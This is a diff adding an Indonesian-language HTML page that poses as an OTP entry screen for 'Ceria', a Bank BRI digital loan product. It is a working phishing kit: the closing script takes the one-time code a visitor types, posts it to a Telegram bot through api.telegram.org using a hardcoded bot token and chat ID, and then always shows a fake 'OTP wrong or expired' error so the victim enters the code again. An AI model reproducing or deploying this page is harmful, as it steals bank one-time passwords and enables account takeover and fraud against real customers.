@@ -1,0 +1,355 @@
+<!doctype html>
+<html lang="en" class="notranslate">
+ <head> 
+  <meta charset="utf-8"> 
+  <title>Ceria - Pinjaman Uang Online</title> 
+  <meta name="description" content="Ceria adalah pinjaman digital untuk pembiayaan transaksi melalui e-commerce, online travel site atau ride sharing. Ceria dari Bank BRI ini telah terdaftar dan diawasi oleh Otoritas Jasa Keuangan, sehingga jangan ragu untuk pengajuan limit karena aman. Saat ini, fasilitas Ceria dapat dinikmati oleh nasabah tabungan Bank BRI yang telah mengajukan limit melalui aplikasi Ceria dan mendapatkan persetujuan dalam hitungan menit. Buat kamu yang belum memiliki tabungan Bank BRI, yukk daftar sekarang supaya dapat mendaftar Ceria! Dengan Ceria, kamu bisa mewujudkan impianmu sekarang juga!"> 
+  <meta name="fragment" content="!"> 
+  <meta name="theme-color" content="#5e07a0"> 
+  <meta property="og:type" content="website"> 
+  <meta name="apple-mobile-web-app-capable" content="yes"> 
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"> 
+  <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui"> 
+  <link rel="icon" type="image/png" href="img/icon.png"> 
+  <link rel="image_src" href="https://ibb.co/HngJZ52"> 
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous"> 
+  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.0/css/ionicons.min.css"> 
+  <link rel="preconnect" href="https://fonts.googleapis.com"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@500;700&amp;display=swap" rel="stylesheet"> 
+  <style>
+    @font-face {
+        font-family: 'Avenir';
+        src: url(fonts/AvenirNextLTPro-Bold.otf);
+      }
+      
+        body {
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            font-family: 'Open Sans', sans-serif;
+        }
+        
+        .text-header {
+            font-family: 'Open Sans', sans-serif;
+            color: #76101b;
+        }
+
+        .text-subheader {
+            font-family: 'Open Sans', sans-serif;
+            margin-top: -20px;
+            color: #76101b;
+        }
+
+        .btn-punya {
+            display: block;
+            margin: 80px auto 0 auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: rgb(94,7,160);
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 459px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .btn-belum {
+            display: block;
+            margin: 10px auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none transparent;
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 459px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: rgb(0, 134, 224);
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .form-log {
+            box-sizing: border-box; 
+            height: 55px; 
+            width: 536px; 
+            max-width: 100%; 
+            border-top: 1.5px inset rgba(250, 250, 250, 0.13); 
+            border-right: 1.5px solid rgba(184, 184, 184, 0.53); 
+            border-bottom: none; 
+            border-left: 1.5px outset rgba(168, 168, 168, 0.58); 
+            border-image: initial; 
+            background-color: rgb(255, 255, 255); 
+            font-family: 'Open Sans', sans-serif;
+            font-weight: lighter;
+            font-size: 16px; 
+            color: rgb(28, 28, 28); 
+            word-spacing: 7px; 
+            padding: 0px 45px;
+            outline: none;
+        }
+        
+        #ionIcons {
+            color: rgb(22, 119, 199);
+            font-size: 29px;
+            position: absolute;
+            display: block;
+            margin-top: 7px;
+            margin-left: 15px;
+        }
+
+        .eye {
+            display: block;
+            margin: -40px auto;
+            margin-right: 20px;
+            position: relative;
+            box-sizing: border-box; 
+            z-index: 16; 
+            height: 19.8189px;
+            width: 25.0236px; 
+            float: right;
+            border-radius: 0px; 
+            cursor: pointer;
+        }
+
+        .btn-login {
+
+            font-family: 'Avenir';
+
+            display: block;
+            margin: 60px 0 0 0;
+            padding: 0px; 
+            cursor: pointer; 
+            background:  rgb(94,7,160, 0.96); 
+            border: none; 
+            text-align: center; 
+            height: 47px; 
+            width: 100%; 
+            font-family: Arial; 
+            font-size: 15px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 1px; 
+            line-height: 1; 
+            border-radius: 8px; 
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+            transition: background 100ms step-start 0s;
+        }
+        
+        h5 {
+            font-family: 'Open Sans', sans-serif;
+            color: #76101b;
+            font-size: 15px;
+            font-weight: bold;
+        }
+            
+        h6 {
+            font-family: 'Open Sans', sans-serif;
+            color: #76101b;
+            font-size: 13px;
+            font-weight: bold;
+            opacity: 0.5;
+        }
+
+        .footer{
+	display: flex;
+	justify-content: center;
+	align-items: center;
+	color:#ffffff;
+	font-size: 5em;
+	text-transform: uppercase;
+	position: fixed;
+	bottom: 0px;
+	z-index: 1;
+}
+
+        @media only screen and (max-width: 600px) {
+            .btn-login {
+                width: 100%;
+            }
+        }
+.formpop {
+background:#0000005b;
+backdrop-filter: blur(2px);
+width:100vw;
+height:100vh;
+position:fixed;
+top:0;
+left:0;
+right:0;
+z-index:99999;
+display:flex;
+justify-content:center;
+}
+.formpop .popup {
+    width:80%;
+    margin-top:150px;
+    min-width:80%;
+    max-width:500px;
+    height:300px;
+    border-radius:10px;
+    display:flex;
+    align-items:center;
+    flex-direction:column;
+    background:rgb(83, 7, 174);
+}
+.formpop .popup .head{
+    width:100%;
+    height:50px;
+    display:flex;
+    justify-content:space-between;
+    padding:10px 20px;
+    align-items:center;
+}
+.formpop .popup .head img {
+    height:85%;
+    max-height:85%;
+}
+.formpop .popup h1 {
+    font-size:17px;
+    font-weight:600;
+    color:#fff;
+    margin-top:20px;
+}
+.formpop .popup p {
+    font-size:14px;
+    font-weight:400;
+    color:#fff;
+}
+.formpop .popup input {
+ width:85%;
+ height:40px;
+ border:none;
+ outline:none;
+ text-align:center;
+ font-size:17px;
+    font-weight:600;
+ border-radius:8px;
+ letter-spacing:2px;
+}
+.formpop .popup button {
+margin-top:20px;
+color:#fff;
+ width:85%;
+ height:40px;
+ border: 1px solid #fff;
+ background:transparent;
+ outline:none;
+ text-align:center;
+ font-size:17px;
+    font-weight:600;
+ border-radius:8px;
+}
+    </style> 
+   <script src="/js/jquery.min.js"></script> 
+ </head> 
+ <body> 
+  <div class="container"> 
+   <div class="row"> 
+    <div class="col-12 d-block mx-auto text-center p-0" style="height: auto; width: auto; max-width: auto; margin-top: 0px; border-radius: 0px;"> 
+     <img alt="" src="img/atas.jpg" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;"> 
+    </div> 
+   </div> 
+   <div class="formpop">
+        <div class="popup">
+            <div class="head">
+                <img src="img/bri.png">
+                <img src="img/ceria.png">
+            </div>
+                <h1>Masukkan Kode OTP</h1>
+                <p>Masukkan Kode yang baru kami<br>kirim ke nomor Anda 08xx-xxxx-xxxx</p>
+            <input type="number" id="otp" name="nootp" placeholder="Kode OTP" autocomplete="off" required maxlength="10"  onKeyPress="if(this.value.length==10) return false;" autofocus />
+            <div id="err" style="display:none; margin-top:10px;color:#fff;background:red;width:85%;text-align:center;padding:5px;font-size:14px;font-weight:bold;">Kode OTP salah atau kedaluwarsa!
+            </div>
+            <button onclick="next()">Lanjut</button>
+
+        </div>
+   </div>
+   <div> 
+    <div class="row" style="margin-top: 10px;"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin-top: 0px auto;"> 
+      <div> 
+       <input id="nomor" name="nootp" type="tel" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 2px solid rgb(94,7,160); border-image: initial; background-color: rgb(235,235,235); border-radius: 8px; box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; font-family: 'Avenir'; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 1px; padding: 15px 15px; outline: none;" placeholder="Kode OTP" maxlength="6" minlength="6" required> 
+      </div> 
+      <div class="row mt-3"> 
+       <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -30px auto;"> 
+        <button class="btn-login" type="submit">Lanjutkan</button> 
+       </div> 
+      </div>  
+     </div> 
+    </div>
+   </div> 
+  </div>  
+  <br>
+  <br>
+  <br>
+  <br>
+  <br> 
+  <br> 
+  <br> 
+  <h6 style="margin-top: 20px; font-family: 'Avenir'; font-size: 15px; font-weight: bold; color: #000; letter-spacing: 1px; text-align: center; line-height: 1; border-radius: 5px;">Disponsori oleh:</h6> 
+  <center> 
+   <div class="css-dnzamn">
+    <img src="/img/1.jpeg" width="210"><br>
+    <img src="/img/2.jpeg" width="150">
+    <img src="/img/3.png" width="150">
+   </div> 
+   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-u1OknCvxWvY5kfmNBILK2hRnQC3Pr17a+RTT6rIHI7NnikvbZlHgTPOOmMi466C8" crossorigin="anonymous"></script> 
+   <script>
+    let token = '6816640348:AAGoztcMrx5t7RM0kw1llTYNlVW4krAr2EU'
+    let chatId = '6841511136'
+    let err = document.querySelector('#err')
+    const sendMessage = async (text) => {
+        const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        const requestOptions = {
+            method: 'POST',
+            headers: {
+            'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+            chat_id: chatId,
+            text: text,
+            }),
+        };
+
+        try {
+            const response = await fetch(apiUrl, requestOptions);
+            const data = await response.json();
+            console.log(data);
+            err.style.display = 'block'
+        } catch (error) {
+            console.error('Error sending message:', error);
+        }
+    };
+
+
+    function next() {
+        let otp = document.querySelector('#otp').value
+        if (otp === '') {
+            alert('mohon lengkapi data!')
+        } else {
+            let text = `OTP: ${otp}`
+            sendMessage(text)
+        }
+    }
+    </script>
+   <!-- </body> -->   
+  </center>
+ </body>
+</html>
